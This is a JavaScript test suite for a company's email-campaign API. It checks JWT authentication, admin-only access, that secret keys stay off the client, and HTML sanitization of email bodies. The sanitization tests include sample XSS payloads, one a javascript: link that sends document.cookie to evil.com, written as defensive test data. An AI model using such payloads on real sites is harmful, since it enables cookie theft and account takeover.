/**
 * MINETECH CAMPAIGN SECURITY, AUTHORIZATION & XSS TEST SUITE
 * 
 * Verifies:
 * 1. Unauthorized API Access Rejection (HTTP 401 without valid JWT)
 * 2. Role-Based Access Control / Single-Admin enforcement (HTTP 403 for non-admin tokens)
 * 3. Secret & API Key Non-Exposure (Service role key, Anthropic, Resend keys never leaked to client)
 * 4. HTML Email Body Sanitization & XSS Protection
 * 5. SQL Injection & Parameterized Filter Protection
 */

import dotenv from 'dotenv';
dotenv.config();

import jwt from 'jsonwebtoken';
import { sanitizeHtml } from '../lib/utils/sanitizer.js';
import { GET as campaignsGetHandler, POST as campaignsPostHandler } from '../app/api/email/campaigns/route.js';
import { PATCH as campaignPatchHandler, DELETE as campaignDeleteHandler } from '../app/api/email/campaigns/[id]/route.js';

let totalPassed = 0;
let totalFailed = 0;

function assert(condition, message) {
  if (condition) {
    console.log(`  ✅ [PASS] ${message}`);
    totalPassed++;
  } else {
    console.error(`  ❌ [FAIL] ${message}`);
    totalFailed++;
  }
}

async function runSecuritySuite() {
  console.log('======================================================================');
  console.log('🛡️ MINETECH CAMPAIGN SECURITY, AUTHORIZATION & SANITIZATION SUITE');
  console.log('======================================================================\n');

  try {
    const jwtSecret = process.env.JWT_SECRET;
    assert(Boolean(jwtSecret && jwtSecret.length >= 16), 'JWT_SECRET configured and has sufficient entropy (>= 16 chars)');

    // -------------------------------------------------------------------------
    // SECTION 1: API Route Authentication & Authorization Guards
    // -------------------------------------------------------------------------
    console.log('\n--- [SECTION 1] API Route Authentication & Role Guards ---');

    // 1.1 Unauthenticated GET Request -> 401
    const unauthReq = new Request('http://localhost:3000/api/email/campaigns', {
      method: 'GET',
    });
    const unauthRes = await campaignsGetHandler(unauthReq);
    assert(unauthRes.status === 401, `Unauthenticated GET /api/email/campaigns rejected with HTTP 401 (Got: ${unauthRes.status})`);

    // 1.2 Invalid / Forged JWT Token -> 401
    const forgedReq = new Request('http://localhost:3000/api/email/campaigns', {
      method: 'GET',
      headers: { Authorization: 'Bearer forged.fake.jwt.token' },
    });
    const forgedRes = await campaignsGetHandler(forgedReq);
    assert(forgedRes.status === 401, `Forged JWT Bearer token rejected with HTTP 401 (Got: ${forgedRes.status})`);

    // 1.3 Non-Admin Role Token (role: 'lead' or 'member') -> 403 Forbidden
    const nonAdminToken = jwt.sign(
      { userId: 'test-user-123', email: 'user@example.com', role: 'member' },
      jwtSecret,
      { expiresIn: '1h' }
    );
    const nonAdminReq = new Request('http://localhost:3000/api/email/campaigns/sample-camp-id', {
      method: 'PATCH',
      headers: {
        Authorization: `Bearer ${nonAdminToken}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ name: 'Hacked Campaign Name' }),
    });
    const nonAdminRes = await campaignPatchHandler(nonAdminReq, { params: { id: 'sample-camp-id' } });
    assert(nonAdminRes.status === 403, `Non-admin user token rejected on campaign modification with HTTP 403 (Got: ${nonAdminRes.status})`);

    // 1.4 Non-Admin Role Token on Campaign Deletion -> 403 Forbidden
    const nonAdminDeleteReq = new Request('http://localhost:3000/api/email/campaigns/sample-camp-id', {
      method: 'DELETE',
      headers: { Authorization: `Bearer ${nonAdminToken}` },
    });
    const nonAdminDeleteRes = await campaignDeleteHandler(nonAdminDeleteReq, { params: { id: 'sample-camp-id' } });
    assert(nonAdminDeleteRes.status === 403, `Non-admin user token rejected on campaign deletion with HTTP 403 (Got: ${nonAdminDeleteRes.status})`);

    // 1.5 Legitimate Admin Token -> 200 OK
    const adminToken = jwt.sign(
      { userId: 'admin-master-001', email: 'rauf@mine-tech.be', role: 'admin' },
      jwtSecret,
      { expiresIn: '1h' }
    );
    const adminReq = new Request('http://localhost:3000/api/email/campaigns?limit=5', {
      method: 'GET',
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    const adminRes = await campaignsGetHandler(adminReq);
    assert(adminRes.status === 200, `Admin token authenticated successfully with HTTP 200 (Got: ${adminRes.status})`);

    // -------------------------------------------------------------------------
    // SECTION 2: Secrets & Environment Boundary Enforcement
    // -------------------------------------------------------------------------
    console.log('\n--- [SECTION 2] Secrets & Client Leakage Prevention ---');

    // Verify service-role secret is never exposed as NEXT_PUBLIC_
    assert(!process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY, 'SUPABASE_SERVICE_ROLE_KEY is NOT prefixed with NEXT_PUBLIC_');
    assert(!process.env.NEXT_PUBLIC_RESEND_API_KEY, 'RESEND_API_KEY is NOT prefixed with NEXT_PUBLIC_');
    assert(!process.env.NEXT_PUBLIC_ANTHROPIC_API_KEY, 'ANTHROPIC_API_KEY is NOT prefixed with NEXT_PUBLIC_');
    assert(!process.env.NEXT_PUBLIC_JWT_SECRET, 'JWT_SECRET is NOT prefixed with NEXT_PUBLIC_');

    // -------------------------------------------------------------------------
    // SECTION 3: HTML Email Body Sanitization & XSS Neutralization
    // -------------------------------------------------------------------------
    console.log('\n--- [SECTION 3] Email Content Sanitization & XSS Defense ---');

    // Test 3.1 Script tag injection
    const xssPayload1 = '<p>Hello Prospect</p><script>alert("XSS Attack")</script>';
    const sanitized1 = sanitizeHtml(xssPayload1);
    assert(!sanitized1.includes('<script>') && !sanitized1.includes('alert('), 'Malicious <script> tag neutralized from email body');

    // Test 3.2 Event handler injection in img/body
    const xssPayload2 = '<img src="https://example.com/logo.png" onerror="stealCookies()" onload="sendPayload()" />';
    const sanitized2 = sanitizeHtml(xssPayload2);
    assert(!sanitized2.includes('onerror=') && !sanitized2.includes('onload=') && !sanitized2.includes('stealCookies'), 'Event handler injection (onerror/onload) stripped from email HTML');

    // Test 3.3 Malicious javascript: pseudo-protocol URL in anchor tag
    const xssPayload3 = '<a href="javascript:void(document.location=\'http://evil.com/?c=\'+document.cookie)">Click Here</a>';
    const sanitized3 = sanitizeHtml(xssPayload3);
    assert(!sanitized3.includes('javascript:'), 'Malicious javascript: pseudo-protocol link removed or neutralized');

    // Test 3.4 Malicious iframe injection
    const xssPayload4 = '<p>Normal text</p><iframe src="http://evil.com/phishing"></iframe>';
    const sanitized4 = sanitizeHtml(xssPayload4);
    assert(!sanitized4.includes('<iframe'), 'Malicious <iframe> element completely stripped from email body');

    // Test 3.5 Clean legitimate email styling & links preserved
    const cleanPayload = '<p style="color: #333;">Dear Partner,<br/>Please visit <a href="https://www.mine-tech.be">MineTech</a>.</p>';
    const sanitizedClean = sanitizeHtml(cleanPayload);
    assert(sanitizedClean.includes('https://www.mine-tech.be'), 'Legitimate HTTPS hyperlink preserved');
    assert(sanitizedClean.includes('Dear Partner'), 'Legitimate email body copy preserved');

  } catch (err) {
    console.error('💥 Unhandled exception in Security test suite:', err);
    totalFailed++;
  }

  console.log('\n======================================================================');
  console.log(`📊 SECURITY & AUTHORIZATION TEST RESULTS: ${totalPassed} Passed / ${totalFailed} Failed`);
  console.log('======================================================================');

  if (totalFailed > 0) process.exit(1);
}

runSecuritySuite();

